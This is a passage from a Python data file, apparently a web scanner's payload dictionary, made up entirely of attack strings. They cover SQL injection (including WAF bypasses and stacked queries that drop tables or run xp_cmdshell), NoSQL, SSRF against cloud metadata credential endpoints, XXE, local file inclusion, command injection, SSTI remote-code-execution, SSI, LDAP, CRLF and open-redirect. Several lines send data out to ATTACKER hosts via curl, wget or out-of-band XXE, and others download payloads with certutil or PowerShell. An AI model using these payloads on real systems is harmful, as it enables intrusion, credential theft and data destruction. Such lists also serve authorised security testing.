            "' AND SUBSTRING((SELECT user()),1,1)='r' --",
            "' AND SUBSTRING((SELECT database()),1,1)='a' --",
            "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96 --",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100 --",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97 --",
            "' AND (SELECT COUNT(*) FROM users)>0 --",
            "' AND (SELECT COUNT(*) FROM users)>10 --",
            "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5 --",
            "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>10 --",
            "' AND (SELECT LENGTH(password) FROM users LIMIT 1)=32 --",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin') --",
            "' AND (SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1)='admin' --",
            "or true --",
            "' or true --",
            '" or true --',
            "') or true --",
            '") or true --',
            "' or 'x'='x",
            "') or ('x')=('x",
            "')) or (('x'))=(('x",
            '" or "x"="x',
            '") or ("x")=("x',
            '")) or (("x"))=(("x',
        ],
        "waf_bypass": [
            # Comment injection
            "' UNI/**/ON SEL/**/ECT NULL,NULL,NULL --",
            "' UNI/**/ON SEL/**/ECT @@ver/**/sion --",
            "' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL --",
            "' /*!50000UNION*/ /*!50000SELECT*/ @@version --",
            "' UN%49ON SEL%45CT NULL,NULL,NULL --",
            # Case toggle
            "' uNiOn SeLeCt NULL,NULL,NULL --",
            "' UnIoN sElEcT NULL,NULL,NULL --",
            "' UnIoN/**/SeLeCt NULL,NULL,NULL --",
            # Whitespace alternatives
            "' UNION%09SELECT%09NULL,NULL,NULL --",
            "' UNION%0aSELECT%0aNULL,NULL,NULL --",
            "' UNION%0dSELECT%0dNULL,NULL,NULL --",
            "' UNION%0d%0aSELECT%0d%0aNULL,NULL,NULL --",
            "'%20UNION%20SELECT%20NULL,NULL,NULL%20--",
            "'+UNION+SELECT+NULL,NULL,NULL+--",
            "'%0bUNION%0bSELECT%0bNULL,NULL,NULL%0b--",
            # No space — parentheses
            "'UNION(SELECT(NULL),(NULL),(NULL))--",
            "'UNION(SELECT(@@version),(NULL),(NULL))--",
            # Double encoding
            "%2527%2520OR%25201%253D1%2520--",
            "%2527%2520UNION%2520SELECT%2520NULL,NULL,NULL%2520--",
            # Hex encoding
            "' UNION SELECT 0x61646D696E,0x70617373,NULL --",
            # String concat bypass
            "' UNION SELECT CONCAT(0x7e,version(),0x7e),NULL,NULL --",
            "' UNION SELECT CONCAT(CHAR(126),version(),CHAR(126)),NULL,NULL --",
            # NULL byte
            "' OR 1=1%00 --",
            "%00' OR 1=1 --",
            # HPP (HTTP Parameter Pollution)
            "1&id=' UNION SELECT NULL,NULL,NULL --",
            # Inline comment variations
            "' OR/**/1=1 --",
            "'/**/OR/**/1=1/**/--",
            "'/**/UNION/**/SELECT/**/NULL,NULL,NULL/**/--",
            # Between/Like bypass
            "' OR 1 LIKE 1 --",
            "' OR 1 NOT BETWEEN 0 AND 0 --",
            # HAVING/GROUP BY error extraction
            "' GROUP BY 1 HAVING 1=1 --",
            "' GROUP BY column_name HAVING 1=1 --",
        ],
        "stacked": [
            "'; DROP TABLE users --",
            "'; SELECT * FROM users --",
            "'; INSERT INTO users (username,password) VALUES ('hacker','hacked') --",
            "'; UPDATE users SET password='hacked' WHERE username='admin' --",
            "'; DELETE FROM users WHERE username='test' --",
            "'; EXEC xp_cmdshell('whoami') --",
            "'; EXEC xp_cmdshell('dir') --",
            "'; EXEC xp_cmdshell('net user') --",
            "'; EXEC master..xp_cmdshell 'ping 127.0.0.1' --",
            "'; CREATE USER hacker IDENTIFIED BY 'hacked' --",
        ],
        "nosql": [
            "true, $where: '1 == 1'",
            ", $where: '1 == 1'",
            "$where: '1 == 1'",
            "', $where: '1 == 1'",
            "1, $where: '1 == 1'",
            "{ $ne: 1 }",
            "', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'",
            "db.injection.insert({success:1})",
            "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
            "|| 1==1",
            "' || 'a'=='a",
            "' && this.password.match(/.*/)//+%00",
            "' && this.passwordzz.match(/.*/)//+%00",
            "'%20%26%26%20this.password.match(/.*/)//+%00",
            "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
            "{$gt: ''}",
            '{"$gt": ""}',
            "[$ne]=1",
            "';sleep(5000);",
            "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
            '{$nin: [""]}',
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$gt": undefined}',
            '{"$exists": true}',
            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
            '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}]}',
        ],
    },
    "ssrf": {
        "internal": [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://[::ffff:127.0.0.1]",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:27017",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:8443",
            "http://127.0.0.1:8888",
            "http://127.0.0.1:3000",
            "http://127.0.0.1:5000",
            "http://127.0.0.1:9090",
            "http://127.0.0.1:9200",
            "http://127.0.0.1:11211",
            "http://10.0.0.1",
            "http://10.0.0.0",
            "http://172.16.0.1",
            "http://172.16.0.0",
            "http://192.168.0.1",
            "http://192.168.1.1",
            "http://192.168.0.0",
            # IP address obfuscation
            "http://2130706433",           # decimal 127.0.0.1
            "http://0x7f000001",           # hex 127.0.0.1
            "http://0x7f.0x0.0x0.0x1",     # hex dotted
            "http://0177.0.0.1",           # octal 127.0.0.1
            "http://0177.0000.0000.0001",  # octal full
            "http://127.1",                # short form
            "http://127.0.1",              # short form
            "http://0",                     # 0.0.0.0
            "http://0.0.0.0",
            "http://000.000.000.000",       # padded zeros
            "http://127.000.000.001",       # padded zeros
            "http://127.0.0.1.nip.io",     # DNS rebinding
            "http://spoofed.burpcollaborator.net",
            "http://localtest.me",          # resolves to 127.0.0.1
            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
            # IPv6
            "http://[0:0:0:0:0:ffff:127.0.0.1]",
            "http://[::ffff:7f00:1]",
            "http://[0000::1]",
            "http://[::]",
        ],
        "cloud_metadata": [
            # AWS IMDSv1
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/instance-type",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/public-hostname",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            # AWS alternate
            "http://[fd00:ec2::254]/latest/meta-data/",
            "http://instance-data/latest/meta-data/",
            # Google Cloud
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/instance/zone",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
            "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
            "http://169.254.169.254/computeMetadata/v1/",
            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
            # DigitalOcean
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
            "http://169.254.169.254/metadata/v1/hostname",
            "http://169.254.169.254/metadata/v1/region",
            "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address",
            "http://169.254.169.254/metadata/v1/dns/nameservers",
            "http://169.254.169.254/metadata/v1/user-data",
            # Alibaba Cloud
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/instance-id",
            "http://100.100.100.200/latest/meta-data/hostname",
            # Oracle Cloud
            "http://169.254.169.254/opc/v1/instance/",
            "http://169.254.169.254/opc/v2/instance/",
            # Kubernetes
            "https://kubernetes.default.svc/",
            "https://kubernetes.default.svc/api/v1/namespaces",
            "https://kubernetes.default.svc/api/v1/pods",
        ],
        "protocols": [
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/net/tcp",
            "file:///proc/net/fib_trie",
            "file:///c:/windows/win.ini",
            "file:///c:/windows/system32/drivers/etc/hosts",
            "dict://127.0.0.1:6379/info",
            "dict://127.0.0.1:6379/CONFIG SET dir /var/www/html",
            "dict://127.0.0.1:11211/stats",
            "gopher://127.0.0.1:6379/_INFO",
            "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html",
            "gopher://127.0.0.1:25/_EHLO%20localhost",
            "gopher://127.0.0.1:3306/_%01%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password",
            "ftp://127.0.0.1",
            "sftp://evil.com",
            "ldap://127.0.0.1",
            "ldaps://127.0.0.1",
            "tftp://evil.com",
            "netdoc:///etc/passwd",
            "jar:http://evil.com/evil.jar!/evil.txt",
        ],
        "bypass": [
            # URL format tricks
            "http://127.0.0.1@evil.com",
            "http://evil.com@127.0.0.1",
            "http://127.0.0.1#@evil.com",
            "http://127.0.0.1%23@evil.com",
            "http://evil.com%00@127.0.0.1",
            "http://127.0.0.1:80@evil.com",
            # Redirect-based SSRF
            "http://evil.com/redirect?url=http://127.0.0.1",
            # DNS rebinding
            "http://A.127.0.0.1.1time.rebind.network",
            # URL encoding
            "http://%31%32%37%2e%30%2e%30%2e%31",
            # Mixed encoding
            "http://127.0.0.1%00@evil.com",
            "http://127.0.0.1%0d%0a@evil.com",
            # Enclosed alphanumerics
            "http://①②⑦.⓪.⓪.①",
            # Parser differential
            "http://127.0.0.1\t.evil.com",
            "http://127.0.0.1%09.evil.com",
        ],
    },
    "xxe": {
        "file_read": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/issue">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
            # PHP filter — read source code as base64
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&xxe;</data>',
            # Expect wrapper (RCE if expect module loaded)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><data>&xxe;</data>',
        ],
        "ssrf_via_xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:443">]><data>&xxe;</data>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://example.com:80">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://example:443">]>',
        ],
        "blind_oob": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">%xxe;]><data>test</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">%xxe;]><data>test</data>',
            '<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'http://ATTACKER_SERVER/?%file;\'>">%int;',
            '<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM \'ftp://ATTACKER_SERVER:21/%data3;\'>">',
            '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">%dtd;%trick;]>',
            '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">%dtd;%trick;]>',
        ],
        "dos": [
            # Billion laughs attack (XML bomb)
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
            # Read /dev/random (hang)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>',
        ],
        "svg_xxe": [
            '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg" width="128" height="128"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
            '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="128" height="128"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        ],
        "soap_xxe": [
            '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/">%dtd;]><xxx/>]]></foo></soap:Body>',
        ],
    },
    "lfi": {
        "linux": [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%00/etc/passwd",
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.php",
            "../../../etc/passwd%00.html",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/issue",
            "/etc/group",
            "/etc/motd",
            "/etc/mysql/my.cnf",
            "/etc/apache2/apache2.conf",
            "/etc/httpd/httpd.conf",
            "/etc/nginx/nginx.conf",
            "/etc/nginx/sites-enabled/default",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/cwd",
            "/proc/self/exe",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            "/proc/version",
            "/proc/net/tcp",
            "/proc/net/fib_trie",
            "/proc/sched_debug",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/access.log",
            "/var/log/apache/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/syslog",
            "/var/log/auth.log",
            "/var/log/mail.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log",
            "/var/www/html/index.php",
            "/var/www/html/wp-config.php",
            "/var/www/html/configuration.php",
            "/var/www/html/.env",
            "/home/*/.ssh/id_rsa",
            "/home/*/.ssh/authorized_keys",
            "/home/*/.bash_history",
            "/root/.ssh/id_rsa",
            "/root/.ssh/authorized_keys",
            "/root/.bash_history",
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://whoami",
            "phar://./payload.phar",
        ],
        "windows": [
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "..%255c..%255c..%255cwindows%255cwin.ini",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\regback\\SAM",
            "C:\\Windows\\repair\\SAM",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\inetpub\\logs\\LogFiles\\",
            "C:\\xampp\\apache\\conf\\httpd.conf",
            "C:\\xampp\\htdocs\\",
            "C:\\Users\\Administrator\\Desktop\\",
            "C:\\Users\\Administrator\\.ssh\\id_rsa",
            "C:\\ProgramData\\",
            "C:\\boot.ini",
        ],
    },
    "cmdi": {
        "unix": [
            "; whoami",
            "| whoami",
            "|| whoami",
            "& whoami",
            "&& whoami",
            "$(whoami)",
            "`whoami`",
            "%0awhoami",
            "%0a%0dwhoami",
            "\\nwhoami",
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "$(id)",
            "`id`",
            "; uname -a",
            "| uname -a",
            "$(uname -a)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "$(cat /etc/passwd)",
            "; ls -la",
            "| ls -la",
            "$(ls -la)",
            "; pwd",
            "| pwd",
            "; ifconfig",
            "| ifconfig",
            "; netstat -an",
            "; ps aux",
            # Time-based blind
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "$(sleep 5)",
            "`sleep 5`",
            "%0asleep 5",
            "; sleep 10",
            "| sleep 10",
            "$(sleep 10)",
            # OOB (Out-of-Band)
            "; curl http://ATTACKER/$(whoami)",
            "| wget http://ATTACKER/$(id|base64)",
            "; nslookup $(whoami).ATTACKER_DOMAIN",
            "; ping -c 3 ATTACKER_IP",
            "; dig $(whoami).ATTACKER_DOMAIN",
            "$(curl http://ATTACKER/$(cat /etc/passwd|base64))",
            # Bypass techniques
            ";{whoami}",
            "$IFS;whoami",
            ";whoami${IFS}",
            "w]h]o]a]m]i",  # bracket bypass
            ";cat$IFS/etc/passwd",
            ";cat${IFS}/etc/passwd",
            ";cat$IFS$9/etc/passwd",
            ";{cat,/etc/passwd}",
            "$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",  # hex encoded whoami
            "$'\\x77\\x68\\x6f\\x61\\x6d\\x69'",
            # Pipe operators
            "; whoami | base64",
            "; cat /etc/passwd | head -5",
            # Newline and carriage return
            "%0Aid",
            "%0D%0Aid",
            "%0a%20id",
            # URL encoded
            "%3Bwhoami",
            "%7Cwhoami",
            "%26whoami",
            "%26%26whoami",
        ],
        "windows": [
            "& whoami",
            "&& whoami",
            "| whoami",
            "|| whoami",
            "& dir",
            "| dir",
            "& ipconfig",
            "| ipconfig",
            "& net user",
            "| net user",
            "& type C:\\windows\\win.ini",
            "| type C:\\windows\\win.ini",
            "& ping -n 5 127.0.0.1",
            "& timeout /t 5",
            "& certutil.exe -urlcache -split -f http://ATTACKER/file.exe file.exe",
            "& powershell -c (New-Object Net.WebClient).DownloadString('http://ATTACKER/')",
        ],
    },
    "ssti": {
        "detection": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{7*7}",
            "{{7*'7'}}",
            "${7*'7'}",
            "#{7*'7'}",
            "{{constructor.constructor('return 7*7')()}}",
            "{{config}}",
            "{{self}}",
            "{{dump(app)}}",
            "{{app.request.server.all|join(',')}}",
            "{{_self.env.getExtension('Twig_Extension_Core')}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "*{T(java.lang.Runtime).getRuntime().exec('whoami')}",
            # Jinja2
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__base__.__subclasses__()}}",
            "{{config.items()}}",
            "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('whoami').read()}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('whoami').read()}}{%endif%}{% endfor %}",
            # Twig
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{['cat /etc/passwd']|filter('system')}}",
            # Freemarker
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}",
            "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"whoami\")}",
            "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}",
            # Mako
            "<%import os;x=os.popen('whoami').read()%>${x}",
            "${self.module.cache.util.os.popen('whoami').read()}",
            # Pebble
            '{% set cmd = "whoami" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null).exec(cmd) %}',
            # Handlebars
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('whoami');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
            # Smarty
            "{php}echo `whoami`;{/php}",
            "{system('whoami')}",
            # Velocity
            "#set($x='')##set($rt=$x.class.forName('java.lang.Runtime'))##set($chr=$x.class.forName('java.lang.Character'))##set($str=$x.class.forName('java.lang.String'))##set($ex=$rt.getRuntime().exec('whoami'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            # ERB
            "<%= system('whoami') %>",
            "<%= `whoami` %>",
            "<%= IO.popen('whoami').readlines() %>",
            # Slim
            "= system('whoami')",
            # Jade/Pug
            "#{root.process.mainModule.require('child_process').execSync('whoami')}",
        ],
    },
    "ssi": {
        "all": [
            '<!--#exec cmd="ls" -->',
            '<!--#exec cmd="whoami" -->',
            '<!--#exec cmd="id" -->',
            '<!--#exec cmd="cat /etc/passwd" -->',
            '<!--#exec cmd="uname -a" -->',
            '<!--#exec cmd="dir" -->',
            '<!--#echo var="DOCUMENT_NAME" -->',
            '<!--#echo var="DOCUMENT_URI" -->',
            '<!--#echo var="DATE_LOCAL" -->',
            '<!--#echo var="REMOTE_ADDR" -->',
            '<!--#echo var="SERVER_NAME" -->',
            '<!--#echo var="SERVER_SOFTWARE" -->',
            '<!--#echo var="SCRIPT_FILENAME" -->',
            '<!--#echo var="DOCUMENT_ROOT" -->',
            '<!--#echo var="HTTP_USER_AGENT" -->',
            '<!--#echo var="HTTP_COOKIE" -->',
            '<!--#echo var="HTTP_REFERER" -->',
            '<!--#echo var="QUERY_STRING" -->',
            '<!--#echo var="REQUEST_METHOD" -->',
            '<!--#echo var="SERVER_PROTOCOL" -->',
            '<!--#echo var="SERVER_PORT" -->',
            '<!--#include file="etc/passwd" -->',
            '<!--#include virtual="/etc/passwd" -->',
            '<!--#config errmsg="File not found" -->',
            '<!--#config timefmt="%Y-%m-%d %H:%M:%S" -->',
            '<!--#printenv -->',
            '<!--#fsize file="index.html" -->',
            '<!--#flastmod virtual="index.html" -->',
            '<pre><!--#exec cmd="ls -la" --></pre>',
            '<pre><!--#exec cmd="whoami"--></pre>',
        ],
    },
    "ldap": {
        "all": [
            "*",
            "*)(&",
            "*)(|(&",
            "*(|(mail=*))",
            "*(|(objectclass=*))",
            "*/*",
            "*|",
            "/",
            "//",
            "//*",
            "@*",
            "x' or name()='username' or 'x'='y",
            "|",
            "*()|&'",
            "admin*",
            "admin*)((|userpassword=*)",
            "*)(uid=*))(|(uid=*",
            "!(cn=*)",
            "*)(%26",
            "*)(objectClass=*",
            "*(cn=*)",
            "*)(&(objectClass=*",
            "admin)(|(password=*))",
            "*)(!(&(1=0",
        ],
    },
    "crlf": {
        "all": [
            "%0d%0aSet-Cookie:mycookie=myvalue",
            "%0d%0aInjected-Header:value",
            "%0aSet-Cookie:mycookie=myvalue",
            "%0dSet-Cookie:mycookie=myvalue",
            "%0d%0a%0d%0a<script>alert(document.domain)</script>",
            "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>",
            "%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
            "%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D<script>alert(document.domain)</script>",
            "\\r\\nSet-Cookie:mycookie=myvalue",
            "\\r\\n\\r\\n<script>alert(document.domain)</script>",
            "%0d%0aLocation:http://evil.com",
            "%0d%0aContent-Type:text/html%0d%0aHTTP/1.1 200 OK%0d%0a%0d%0aevil",
            "%c4%8d%c4%8aSet-Cookie:mycookie=myvalue",
        ],
    },
    "open_redirect": {
        "all": [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com/",
            "//evil.com/",
            "/\\/evil.com",
            "https://example.com@evil.com",
            "https://example.com.evil.com",
            "https://evil.com/example.com",
            "https://evil.com%23.example.com",
            "https://evil.com%2F.example.com",
            "//evil.com%2F%2Fexample.com",
            "/%0D/evil.com",
            "/%09/evil.com",
            "/\\\\evil.com",
            "\\\\evil.com",
            "\\/\\/evil.com",
            "/evil.com",
            "////evil.com",
            "https:evil.com",
            "http:evil.com",
            "https:/evil.com",
            "http:/evil.com",
            "https:%252F%252Fevil.com",
            "http:%252F%252Fevil.com",
            "///evil.com",
            "///evil.com/",
            "//evil.com%2F@example.com",
            "/https://evil.com",
            "javascript:alert(document.domain)//",
            "data:text/html,<script>alert(document.domain)</script>",
            "//evil%00.com",
            "https://evil.com/%2F%2E%2E",
            "/%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
            "https://evil.com%E3%80%82example.com",
            "。evil.com",
            "%E3%80%82evil.com",
            "https://evil.com@:80@example.com",
